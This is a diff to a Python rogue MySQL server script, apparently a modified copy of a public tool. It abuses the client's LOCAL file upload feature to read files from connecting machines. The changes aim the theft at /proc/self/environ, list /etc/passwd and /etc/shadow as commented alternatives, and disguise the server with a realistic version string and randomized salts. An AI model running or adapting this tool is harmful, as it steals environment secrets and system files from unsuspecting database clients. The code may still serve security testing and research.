@@ -1,6 +1,8 @@
 #!/usr/bin/env python
 #coding: utf8
-
+#Modified Copy of https://raw.githubusercontent.com/Gifts/Rogue-MySql-Server/master/rogue_mysql_server.py
+#Copyright (c) 2013, Gifts
+#Modification (c) 2019 oneiroi{at}fedoraproject.org
 
 import socket
 import asyncore
@@ -9,10 +11,9 @@ import struct
 import random
 import logging
 import logging.handlers
+from string import lowercase
 
-
-
-PORT = 3306
+PORT = 3307
 
 log = logging.getLogger(__name__)
 
@@ -25,7 +26,11 @@ log.addHandler(
 
 filelist = (
 #    r'c:\boot.ini',
-    r'c:\windows\win.ini',
+    #r'c:\windows\win.ini',
+     r'/proc/self/environ',
+   # note relative paths such as ~ do not appear to be expanded, your requested file path must be the full path
+   # r'/etc/hostname',       #test known file
+   # r'/etc/hosts',          #Hosts file _could_ contain interesting artefacts
 #    r'c:\windows\system32\drivers\etc\hosts',
 #    '/etc/passwd',
 #    '/etc/shadow',
@@ -36,15 +41,17 @@ filelist = (
 #=======No need to change after this lines=======
 #================================================
 
-__author__ = 'Gifts'
+__author__ = 'Gifts, Oneiroi'
 
 def daemonize():
     import os, warnings
     if os.name != 'posix':
         warnings.warn('Cant create daemon on non-posix system')
         return
+    #daemonmizing is not required for limited testing, you may wish to add threading howeverw
+    return
 
-    if os.fork(): os._exit(0)
+    """if os.fork(): os._exit(0)
     os.setsid()
     if os.fork(): os._exit(0)
     os.umask(0o022)
@@ -54,7 +61,7 @@ def daemonize():
             os.dup2(null, i)
         except OSError as e:
             if e.errno != 9: raise
-    os.close(null)
+    os.close(null)"""
 
 
 class LastPacket(Exception):
@@ -109,20 +116,53 @@ class http_request_handler(asynchat.async_chat):
         self.state = 'LEN'
         self.sub_state = 'Auth'
         self.logined = False
+
+        #What follows is summary in comment form from the mysql documentation
+        #From: https://dev.mysql.com/doc/dev/mysql-server/latest/page_protocol_connection_phase.html
+
+        #1. exchnage capabilities of client and server
+        #2. Setup SSL/TLS communication if requested
+        #3. authenticate against the server
+
+        #after the initial handhsake. server informs client about the method to be used for auth,
+        #unless it was already established during the handshake, and the auth exchnage continues until either
+        #server accepts connection and send OK_Packet or rjectes with ERR_Packet
+
+        #Do not adverstise ssl capability, as this adds overhead (Add support later)
+        #Handle auth 
+        #1. Send handshake, (sans SSL/TLS capability).
+        #2. Interpret response packet.
+        #3. Send malicious payload to trigger LOCAL file upload to $server
+
+        #https://dev.mysql.com/doc/dev/mysql-server/latest/page_protocol_connection_phase_packets_protocol_handshake_v10.html
+        #Protocol::HandshakeV10
+        #int<1> - protocol version - always 10
+        #string<nul> - server version - human readable status info
+        #int<4> - tread id - aka connection id
+        #string<8> - auth-plugin-data-part-1 - first 8 bytes of plugin provided data (scramble)
+        #int<1> - filler - 0x00 byte, terminating the first part of scramble
+        #int<2> - capability_flags_1 - lower two bytes of Capabilities flags
+        #int<2> - character_set - default a_protocol_character_set, only the lower 8-bits
+        #int<2>  = status_flags - SERVER_STATUS_flags_enum
+        #int<2>  - capability_flags_2 - the upper 2 bytes of Capabilities flags
+        #int<1>  - if capabilities & CLIENT_PLUGIN_AUTH plugin_data_len ELSE 0x00
+        #string[10] - reserved - reserved (not used) all 0's 
+        # $length - auth_plugin_data_part-2 - Rest of plugin provided data (scramble), $len=MAX(13, len(auth_plugin_data)==8)
+       
         self.push(
             mysql_packet(
                 0,
                 "".join((
-                    '\x0a',  # Protocol
-                    '3.0.0-Evil_Mysql_Server' + '\0',  # Version
-                    #'5.1.66-0+squeeze1' + '\0',
-                    '\x36\x00\x00\x00',  # Thread ID
-                    'evilsalt' + '\0',  # Salt
-                    '\xdf\xf7',  # Capabilities
-                    '\x08',  # Collation
-                    '\x02\x00',  # Server Status
-                    '\0' * 13,  # Unknown
-                    'evil2222' + '\0',
+                    '\x0a',  # mysql.protocol
+                    #'3.0.0-Evil_Mysql_Server' + '\0',  # Version
+                    '5.1.66-0+squeeze1' + '\0', #mysql.version
+                    '\x36\x00\x00\x00',  # mysql.thread_id
+                    ''.join(random.choice(lowercase) for _ in range(7)) + '\0',  # mysql.salt (7bytes)
+                    '\xff\xf7',  # mysql.caps.sc
+                    '\x08',  # mysql.server_language
+                    '\x02\x00',  # mysql.stat.ps_out_params
+                    '\0' * 12,  # mysql.caps.unused + mysql.auth_plugin.length + mysql.unused
+                    ''.join(random.choice(lowercase) for _ in range(7)) + '\0',  # mysql.salt2 (9bytes)
                 ))
             )
         )
